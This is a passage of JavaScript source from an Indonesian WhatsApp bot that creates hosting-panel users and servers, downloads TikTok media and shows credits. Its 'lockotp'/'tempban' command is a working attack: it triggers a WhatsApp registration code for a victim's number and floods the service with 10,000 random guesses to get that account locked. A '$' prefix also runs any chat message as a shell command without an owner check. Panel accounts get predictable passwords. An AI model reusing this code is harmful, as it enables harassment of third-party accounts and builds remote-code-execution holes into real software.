let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "7024"
let cpu = "170"
let disk = "7024"
let email = username + "Bara@Cyber.io"
akunlo = "https://b.top4top.io/p_3189wqnd31.jpg" 
if (!u) return
let d = (await BaraCybeer.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
BaraCybeer.sendMessage(u, { image: { url: 'https://b.top4top.io/p_3189wqnd31.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return BaraCybeer(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case '8gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return BaraCybeer(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "8024"
let cpu = "180"
let disk = "8024"
let email = username + "Bara@Cyber.io"
akunlo = "https://b.top4top.io/p_3189wqnd31.jpg" 
if (!u) return
let d = (await BaraCybeer.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
BaraCybeer.sendMessage(u, { image: { url: 'https://b.top4top.io/p_3189wqnd31.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return BaraCybeer(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case '9gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return BaraCybeer(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "9024"
let cpu = "190"
let disk = "9024"
let email = username + "zxv@sweetrabit.ml"
akunlo = "https://b.top4top.io/p_3189wqnd31.jpg" 
if (!u) return
let d = (await BaraCybeer.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
BaraCybeer.sendMessage(u, { image: { url: 'https://b.top4top.io/p_3189wqnd31.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return BaraCybeer(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case 'unli': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return BaraCybeer(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "Bara@Cyber.io"
akunlo = "https://b.top4top.io/p_3189wqnd31.jpg" 
if (!u) return
let d = (await BaraCybeer.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
BaraCybeer.sendMessage(u, { image: { url: 'https://b.top4top.io/p_3189wqnd31.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return BaraCybeer(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break
//=================================================//
case "listsrv": {
if (!isOwner) return reply(mess.only.owner)
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
let messageText = "Berikut adalah daftar server:\n\n";

for (let server of servers) {
let s = server.attributes;

let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});

let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;

messageText += `ID Server: ${s.id}\n`;
messageText += `Nama Server: ${s.name}\n`;
messageText += `Status: ${status}\n\n`;
}

messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total Server: ${res.meta.pagination.count}`;

await BaraCybeer.sendMessage(m.chat, { text: messageText }, { quoted: m });

if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
reply(`Gunakan perintah ${prefix ? prefix : '.'}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break;
//=================================================//
case "delsrv": {
if (!isOwner) return reply(mess.only.owner)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('Server tidak ditemukan')
reply('Berhasil minghapus Server.')
}
break
// BATAS

//=================================================//
case 'script': case 'sc': {
reactemoji('😂')
let sound = fs.readFileSync('./all/kontol.mp3')
return replymenu(`Esceh Nya Gak Gratis Bro, Minimal Kalo Cari Sc Free Di *YT* Aja,

┏━━━━━━━━━━━
┃Tanks To For
┗══╦══════
        ║
╔══╩═══════════════╗
║   ╴𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥 ╴
║Base : 𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥
║Creator : BaraCybeer
╚━═━═━═━═━═━═━═━═━═╝
© Always 𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥 | 1999`) 
}
break
//=================================================//
case 'cekbot': 
case 'totalfitur': {
ngaceng = fs.readFileSync("./case.js").toString(),
matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);
let block = await BaraCybeer.fetchBlocklist()
let gcall = Object.values(await BaraCybeer.groupFetchAllParticipating().catch(_=> null))
let totalCases = caseCount,
listCases = caseNames.join('\n${prefix} ');
reply(` *Haii* @${m.sender.split("@")[0]},

*𝐓𝐎𝐓𝐀𝐋 𝐅𝐄𝐀𝐓𝐔𝐑𝐄 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬*

┏
┃𝐓𝐨𝐭𝐚𝐥𝐅𝐢𝐭𝐮𝐫 : *${totalFitur()} Fitur*
┗═━═━═━═━═

*Copyright by BaraCyber*`)
}
break
case 'cr': case 'credits': case 'tqto': case 'thanksto': {
let me = m.sender

let muahh = fs.readFileSync('./lib/tqto.mp3')
let tqto = `─┉┈◈ * BIG THANKS TO *◈┈┉

【 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬 】

╭── ⋅ ⋅ ── ✩ ── ⋅ ⋅ ──╮
» Allah SWT 
» Orang Tua
» BaraCyber ( Dev )
╰── ⋅ ⋅ ── ✩ ── ⋅ ⋅ ──╯

〖 Dan yang ikut perkembangan script ini 〗`
BaraCybeer.sendMessage(from, { 
text: tqto,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Main Tqto`,
"body": `Date : ${wib}, ${tanggal}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnailUrl": "https://b.top4top.io/p_3189wqnd31.jpg",
"sourceUrl": `${isLink}`
}
}
},{ 
quoted: fkontak })
await sleep(1500)
BaraCybeer.sendMessage(m.chat,{
audio: muahh,mimetype:'audio/mp4', ptt:true })
      }
      break
      case 'lockotp': case 'tempban': {
	if (!isPremium) return reply(mess.only.premium)
  if (args.length < 1) return reply(`Fomat Anda Salah Titid\n\nContoh: ${prefix+command} country_code|number\nExample: ${prefix+command} 91|62838×××××`);
  const args2 = args[0].split('|');
  if (args2.length !== 2) return reply(`Fomat Anda Salah Titid\n\nContoh: ${prefix+command} country_code|number\nExample: ${prefix+command} 91|62838×××××`);
  const HdzCountryCode = args2[0];
  const xtarget = args2[1];
  const hdzNumber = xtarget.replace('@s.whatsapp.net', '');
  const baramerge = `${HdzCountryCode}${xtarget}`
  const hdzMention = baramerge + '@s.whatsapp.net';
  sendMessageWithMentions(
    "Successfully Activated OTP LOCK To @" + hdzMention.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [hdzMention]
  );
  try {
    const { statebara, saveCredsbara } = await useMultiFileAuthState('./session');
    const baraRequest = await BaraCybeer.requestRegistrationCode({
      phoneNumber: '+' + HdzCountryCode + `${hdzNumber}`,
      phoneNumberCountryCode: HdzCountryCode,
      phoneNumberNationalNumber: `${hdzNumber}`,
      phoneNumberMobileCountryCode: 724,
      method: 'sms'
    });
  } catch (err) {
  }
  
  for (let i = 0; i < 10000; i++) {
    try {
      var hdztzyPrefix = Math.floor(Math.random() * 999);
      var hdztzySuffix = Math.floor(Math.random() * 999);
      await BaraCybeer.register(`${hdztzyPrefix}-${hdztzySuffix}`);
    } catch (err) {
      console.log(`${hdztzyPrefix}-${hdztzySuffix}`);
    }
  }
}
break;
      case 'backup':
                if (!isOwner) return reply(mess.only.owner)
                if (m.isGroup) return reply(mess.only.private)
                reply(mess.only.wait)
                exec('zip backup.zip')
                let malas = await fs.readFileSync('./backup.zip')
                await BaraCybeer.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
//============= CASE MAIN =============//
case 'hd':
case 'hdimg': 
case 'remini':
case 'hdr': {
if (!/image/.test(mime)) return reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
await BaraCybeer.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
const { remini } = require('./lib/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
BaraCybeer.sendMessage(m.chat, { image: proses, caption: 'Sukses Sayang 𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥'}, { quoted: m})
}
break
case 'ttmp3': {
const clean = (data) => {
  let regex = /(<([^>]+)>)/gi;
  data = data.replace(/(<br?\s?\/>)/gi, " \n");
  return data.replace(regex, "");
};

async function shortener(url) {
  return url;
}

async function Tiktok(query) {
  let response = await axios("https://lovetik.com/api/ajax/search", {
    method: "POST",
    data: new URLSearchParams(Object.entries({ query })),
  });

  let result = {};

  result.creator = "Tioxy";
  result.title = clean(response.data.desc);
  result.author = clean(response.data.author);
  result.nowm = await shortener(
    (response.data.links[0].a || "").replace("https", "http")
  );
  result.watermark = await shortener(
    (response.data.links[1].a || "").replace("https", "http")
  );
  result.audio = await shortener(
    (response.data.links[2].a || "").replace("https", "http")
  );
  result.thumbnail = await shortener(response.data.cover);
  return result;
}


let input = `[!] *wrong input*
	
Ex : ${prefix + command} https://vm.tiktok.com/ZSL7p9jRV/`
	if (!text) return m.reply(input)
reply(mess.wait)
  let res = await Tiktok(text)
  let cap = `乂 *T i k  T o k*\n♮ *Username:* ${res.author}\n♮ *Description:* ${res.title}
`
//let a = await BaraCybeer.sendFile(m.chat, res.thumbnail || emror, '', cap, m)
 
await BaraCybeer.sendMessage(m.chat, { 
    audio: { url: res.audio }, 
    mimetype: 'audio/mpeg', 
    fileName: `${res.title}.mp3`,
    ptt: false
  }, {quoted: m})
}
break
case 'ttdl': case 'tiktok': case 'tt': {
async function tiktok(url) {
    try {
        const data = new URLSearchParams({
            'id': url,
            'locale': 'id',
            'tt': 'RFBiZ3Bi'
        });

        const headers = {
            'HX-Request': true,
            'HX-Trigger': '_gcaptcha_pt',
            'HX-Target': 'target',
            'HX-Current-URL': 'https://ssstik.io/id',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
            'Referer': 'https://ssstik.io/id'
        };

        const response = await axios.post('https://ssstik.io/abc?url=dl', data, {
            headers
        });
        const html = response.data;

        const $ = cheerio.load(html);

        const author = $('#avatarAndTextUsual h2').text().trim();
        const title = $('#avatarAndTextUsual p').text().trim();
        const video = $('.result_overlay_buttons a.download_link').attr('href');
        const audio = $('.result_overlay_buttons a.download_link.music').attr('href');
        const imgLinks = [];
        $('img[data-splide-lazy]').each((index, element) => {
            const imgLink = $(element).attr('data-splide-lazy');
            imgLinks.push(imgLink);
        });

        const result = {
            isSlide: video ? false : true,
            author,
            title,
            result: video || imgLinks,
            audio
        };
        return result
    } catch (error) {
        console.error('Error:', error);
        return null;
    }
}
 

//if (!isRegistered) return registerbut(noregis)
    let input = `[!] *𝙴𝚛𝚘𝚛 𝙸𝚗𝚙𝚞𝚝*
	
Ex : ${prefix + command} https://vt.tiktok.com/ZSFm1R2yK/`

    if (!text) return m.reply(input)

    if (!(text.includes('http://') || text.includes('https://'))) return reply(`𝙻𝙸𝙽𝙺 𝚒𝚗𝚟𝚊𝚕𝚒𝚍, 𝚙𝚕𝚎𝚊𝚜𝚎 𝚒𝚗𝚙𝚞𝚝 𝚊 𝚟𝚊𝚕𝚒𝚍 𝙻𝙸𝙽𝙺,\n𝚃𝚛𝚢 𝚠𝚒𝚝𝚑 *𝐡𝐭𝐭𝐩𝐬://* 𝚘𝚛 *𝐡𝐭𝐭𝐩𝐬://*`)
    if (!text.includes('tiktok.com')) return reply(`𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐋𝐈𝐍𝐊.`)

    const {
        isSlide,
        result,
        title,
        author
    } = await tiktok(text);
    let no = 1

    if (isSlide == true) {
        await reply(mess.wait)
        let cap = `👋 *Tiktok Image*\n\n`
        let no = 1
        for (let img of result) {
        
BaraCybeer.sendMessage(m.chat, { caption:  `${cap} ﻿${no++}`, image: { url: img }}, {quoted: m});
        // await BaraCybeer.sendFile(m.sender, img, '', `${cap}*【﻿${no++}】*`, null)
            await delay(2000)
        }
    } else if (isSlide == false) {
        await reply(mess.wait)
        let vd = `Caption : *${title}*

 Caption : ${author}`
//await BaraCybeer.sendMessage(m.chat, { caption: title, video: { url: result }}, {quoted: m});
const heho = [
                {
   name: "quick_reply",
   buttonParamsJson: JSON.stringify({
      display_text: "Audio 🎧",
      id: `.ttmp3 ${text}`
   })
}
]

// button text
BaraCybeer.sendButtonVideo(m.chat, heho, m, {
   video: result,
   body: '𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬',
   footer: global.namabot
})
    }
}
break
// BATAS

//=================================================//
default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
BaraCybeer.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})